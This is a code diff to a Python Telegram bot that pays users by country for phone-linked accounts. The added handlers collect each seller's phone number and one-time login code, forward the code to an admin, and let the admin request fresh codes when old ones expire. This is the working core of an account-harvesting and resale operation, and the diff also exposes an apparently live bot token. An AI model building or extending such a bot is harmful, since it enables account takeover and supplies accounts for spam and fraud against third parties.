@@ -7,12 +7,12 @@ BOT_TOKEN = "8266639049:AAFvQYw-ax6y94S2zH_oMg7jA2Q1Dxh6yro"
 CHANNEL_LINK = "https://t.me/NR_receiver_News"
 SUPPORT_USERNAME = "https://t.me/TG_BUYER_NR"
 
-# Admin ID (replace with your Telegram ID)
+# Admin ID
 ADMIN_ID = 1378825382  
 
-# Storage paths (Render Disk)
-USER_FILE = "/mnt/data/users.json"
-ORDER_FILE = "/mnt/data/orders.json"
+# Storage paths (local for free Render plan)
+USER_FILE = "users.json"
+ORDER_FILE = "orders.json"
 
 # Country Pricing
 COUNTRIES = {
@@ -65,6 +65,10 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode="Markdown"
     )
 
+# /id (to get user ID)
+async def get_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(f"👤 Your Telegram ID is: `{update.effective_user.id}`", parse_mode="Markdown")
+
 # Button Handler
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -113,16 +117,71 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif query.data == "back":
         await start(update, context)
 
+    # ===== ADMIN CONTROLS =====
+    elif query.from_user.id == ADMIN_ID:
+        if query.data.startswith("admin_request_"):
+            order_id = query.data.split("_")[2]
+            orders[order_id]["status"] = "otp_requested"
+            save_data(ORDER_FILE, orders)
+
+            await context.bot.send_message(
+                chat_id=orders[order_id]["user_id"],
+                text="🔐 Please send the OTP code for your account now."
+            )
+            await query.edit_message_text(f"✅ OTP requested for order {order_id}")
+
+        elif query.data.startswith("admin_reject_"):
+            order_id = query.data.split("_")[2]
+            orders[order_id]["status"] = "rejected"
+            save_data(ORDER_FILE, orders)
+
+            await context.bot.send_message(
+                chat_id=orders[order_id]["user_id"],
+                text="❌ Your sell request has been rejected."
+            )
+            await query.edit_message_text(f"❌ Order {order_id} rejected")
+
+        elif query.data.startswith("admin_approve_"):
+            order_id = query.data.split("_")[2]
+            order = orders[order_id]
+            user_id = order["user_id"]
+
+            # Update user balance
+            users[user_id]["balance"] += COUNTRIES[order["country"]]["price"]
+            users[user_id]["sold"] += 1
+            save_data(USER_FILE, users)
+
+            orders[order_id]["status"] = "completed"
+            save_data(ORDER_FILE, orders)
+
+            await context.bot.send_message(
+                chat_id=user_id,
+                text=f"✅ Your account has been successfully sold!\n💰 ${COUNTRIES[order['country']]['price']} credited to your balance."
+            )
+            await query.edit_message_text(f"✅ Order {order_id} approved and user credited.")
+
+        elif query.data.startswith("admin_retry_"):
+            order_id = query.data.split("_")[2]
+            orders[order_id]["status"] = "otp_requested"
+            save_data(ORDER_FILE, orders)
+
+            await context.bot.send_message(
+                chat_id=orders[order_id]["user_id"],
+                text="🔄 Please send another OTP, the previous one has expired."
+            )
+            await query.edit_message_text(f"🔄 Another OTP requested for order {order_id}")
+
 # Handle Phone Numbers & OTP Flow
 async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = str(user.id)
     users = load_data(USER_FILE)
     orders = load_data(ORDER_FILE)
+    text = update.message.text.strip()
 
     # User is sending phone number
     if "selling_country" in context.user_data:
-        phone = update.message.text.strip()
+        phone = text
         country = context.user_data["selling_country"]
 
         # Check if phone already sold
@@ -157,13 +216,36 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         del context.user_data["selling_country"]
 
-# TODO: Admin OTP & Approval Flow Handlers (to be added next)
+    # User sending OTP (check for pending OTP request)
+    else:
+        pending_orders = [o for o in orders.values() if o["user_id"] == user_id and o["status"] == "otp_requested"]
+        if pending_orders:
+            order = pending_orders[0]
+            order_id = order["id"]
+
+            orders[order_id]["otp"] = text
+            orders[order_id]["status"] = "otp_submitted"
+            save_data(ORDER_FILE, orders)
+
+            # Send OTP to admin
+            keyboard = [
+                [InlineKeyboardButton("🔄 Request Another Code", callback_data=f"admin_retry_{order_id}")],
+                [InlineKeyboardButton("✅ Approve", callback_data=f"admin_approve_{order_id}")],
+                [InlineKeyboardButton("❌ Reject", callback_data=f"admin_reject_{order_id}")]
+            ]
+            await context.bot.send_message(
+                chat_id=ADMIN_ID,
+                text=f"🔐 OTP received for Order {order_id}\nPhone: {order['phone']}\nOTP: {text}",
+                reply_markup=InlineKeyboardMarkup(keyboard)
+            )
+            await update.message.reply_text("✅ OTP received. Please wait for admin review.")
 
 # Main
 def main():
     app = Application.builder().token(BOT_TOKEN).build()
 
     app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("id", get_id))
     app.add_handler(CallbackQueryHandler(button_handler))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
 
